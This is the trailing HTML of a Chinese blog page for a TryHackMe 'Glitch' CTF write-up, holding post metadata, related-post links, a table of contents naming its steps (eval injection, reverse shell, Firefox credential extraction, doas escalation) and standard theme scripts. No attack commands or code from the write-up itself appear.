+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/TryHackMe_glitch.html">https://x9wd09ncc.github.io/post/TryHackMe_glitch.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/nodejs/">nodejs</a><a class="post-meta__tags" href="/tags/eval%E6%B3%A8%E5%85%A5/">eval注入</a><a class="post-meta__tags" href="/tags/firefox%E5%87%AD%E8%AF%81%E6%8F%90%E5%8F%96/">Firefox凭证提取</a><a class="post-meta__tags" href="/tags/doas/">doas</a><a class="post-meta__tags" href="/tags/wfuzz/">wfuzz</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/TryHackMe_VulnNet_Roasted.html" title="TryHackMe_VulnNet_Roasted"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_VulnNet_Roasted</div></div></a></div><div class="next-post pull-right"><a href="/post/TryHackMe_Mr%20Robot%20CTF.html" title="TryHackMe_Mr Robot CTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_Mr Robot CTF</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/TryHackMe_VulnNet_Node.html" title="TryHackMe_VulnNet_Node"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-23</div><div class="title">TryHackMe_VulnNet_Node</div></div></a></div><div><a href="/post/TryHackMe_kiba.html" title="TryHackMe_kiba"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-23</div><div class="title">TryHackMe_kiba</div></div></a></div><div><a href="/post/TryHackMe_Agent_T.html" title="TryHackMe_Agent_T"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-25</div><div class="title">TryHackMe_Agent_T</div></div></a></div><div><a href="/post/TryHackMe_Archangel.html" title="TryHackMe_Archangel"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-15</div><div class="title">TryHackMe_Archangel</div></div></a></div><div><a href="/post/TryHackMe_All%20in%20One.html" title="TryHackMe_All in One"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-23</div><div class="title">TryHackMe_All in One</div></div></a></div><div><a href="/post/TryHackMe_Anthem.html" title="TryHackMe_Anthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Anthem</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">题目概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84"><span class="toc-number">1.1.</span> <span class="toc-text">攻击路径</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.</span> <span class="toc-text">1. 端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">2. 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E9%9A%90%E8%97%8F-JS-%E8%B7%AF%E7%94%B1"><span class="toc-number">3.1.</span> <span class="toc-text">2.1 隐藏 JS 路由</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-API-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">3.2.</span> <span class="toc-text">2.2 API 目录扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-x2F-api-x2F-items-%E5%88%86%E6%9E%90"><span class="toc-number">3.3.</span> <span class="toc-text">2.3 &#x2F;api&#x2F;items 分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%8F%82%E6%95%B0%E7%88%86%E7%A0%B4%E4%B8%8E-eval-%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">3. 参数爆破与 eval 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-wfuzz-%E7%88%86%E7%A0%B4%E5%8F%82%E6%95%B0%E5%90%8D"><span class="toc-number">4.1.</span> <span class="toc-text">3.1 wfuzz 爆破参数名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-eval-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-number">4.2.</span> <span class="toc-text">3.2 eval() 漏洞发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-RCE-%E5%88%A9%E7%94%A8"><span class="toc-number">4.3.</span> <span class="toc-text">3.3 RCE 利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-%E5%8F%8D%E5%BC%B9-Shell"><span class="toc-number">4.4.</span> <span class="toc-text">3.4 反弹 Shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Cookie-%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6"><span class="toc-number">5.</span> <span class="toc-text">4. Cookie 验证机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E7%94%A8%E6%88%B7%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E2%80%94-Firefox-%E5%87%AD%E8%AF%81%E6%8F%90%E5%8F%96"><span class="toc-number">6.</span> <span class="toc-text">5. 用户横向移动 — Firefox 凭证提取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E5%8F%91%E7%8E%B0-Firefox-%E9%85%8D%E7%BD%AE%E7%9B%AE%E5%BD%95"><span class="toc-number">6.1.</span> <span class="toc-text">5.1 发现 Firefox 配置目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E5%88%87%E6%8D%A2%E5%88%B0-v0id-%E7%94%A8%E6%88%B7"><span class="toc-number">6.2.</span> <span class="toc-text">5.2 切换到 v0id 用户</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-doas-%E6%8F%90%E6%9D%83"><span class="toc-number">7.</span> <span class="toc-text">6. doas 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-%E5%8F%91%E7%8E%B0-doas"><span class="toc-number">7.1.</span> <span class="toc-text">6.1 发现 doas</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-%E5%88%86%E6%9E%90-doas-%E9%85%8D%E7%BD%AE"><span class="toc-number">7.2.</span> <span class="toc-text">6.2 分析 doas 配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-3-%E6%8F%90%E6%9D%83%E8%87%B3-root"><span class="toc-number">7.3.</span> <span class="toc-text">6.3 提权至 root</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By X9wd09ncc</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.bootcdn.net/ajax/libs/click-heart/1.0.0/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
